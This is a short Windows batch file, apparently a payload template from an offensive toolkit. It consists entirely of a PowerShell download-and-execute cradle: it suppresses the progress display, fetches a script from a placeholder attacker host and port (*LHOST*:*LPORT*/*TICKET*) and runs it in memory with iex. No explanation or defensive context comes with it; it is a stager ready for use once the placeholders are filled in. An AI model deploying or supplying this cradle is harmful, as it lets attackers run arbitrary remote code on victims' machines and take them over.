@echo off
powershell -nop -c "$ProgressPreference='SilentlyContinue';iex (New-Object System.Net.WebClient).DownloadString('http://*LHOST*:*LPORT*/*TICKET*')"
